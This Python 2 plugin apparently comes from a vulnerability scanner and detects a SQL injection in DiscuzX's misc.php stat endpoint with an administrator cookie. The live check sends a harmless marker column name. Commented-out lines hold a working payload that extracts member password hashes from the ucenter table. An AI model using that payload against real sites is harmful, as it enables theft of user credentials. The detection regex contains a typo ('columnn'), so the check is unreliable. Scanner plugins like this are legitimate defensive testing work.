# -*- coding: utf-8 -*-
'''
本插件针对 DiscuzX系列 的 SQL型注入漏洞，注意点在 misc.php 文件 GET方式请求，要求有管理员权限
author: lidq
created: 20161213
'''

# 导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
# 导入url请求公用库
from engine.engine_utils.InjectUrlLib import *

from engine.engine_utils.common import *
# 导入日志处理句柄
from engine.logger import scanLogger as logger
# 导入默认的header头
from engine.engine_utils.DictData import headerDictDefault
import re


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    # 重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    headers = {
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
        #    'Host': 'discuzx15.target.safety.local.com',
        'Cache-Control': 'max-age=0'
    }
    headers['cookie'] = config['cookie']
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    responseList = []
    try:
        # 使用单引号测试是否存在SQL报错，有则存在漏洞
        payload = "'"
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']
        url = urlBase + '/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=yundunScan'
        # url = urlBase + '/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password `as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as'
        # url = urlBase + '/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as'
        # url = urlBase + '/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]='+urllib.quote('password`as statistic from pre_common_statuser,pre_ucenter_members as`')
        response = request(url=url, headers=headers, method="GET")
        if response['httpcode'] == 200:
            # pattern = re.compile(r'<value\sxid\="\d{1,3}">([a-z0-9]{32})<\/value>')
            # matches = pattern.findall(response['response_body'])
            # if matches:
            # if response['response_body'].find('as statistic from common_statuser,ucenter_members as'):
            if re.search('unknown.*?columnn.*?yundunScan', response.get('response_body'), re.I):
                injectInfo = returnInjectResult(url=urlBase, confirm=1,
                                                detail="DiscuzX 的 misc.php 文件get方式的SQL注入漏洞,需要管理员权限", response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
                return responseList

    except Exception, e:
        logger.error("File:DiscuzX15_sql_get_misc.py:" + str(e))
    return responseList
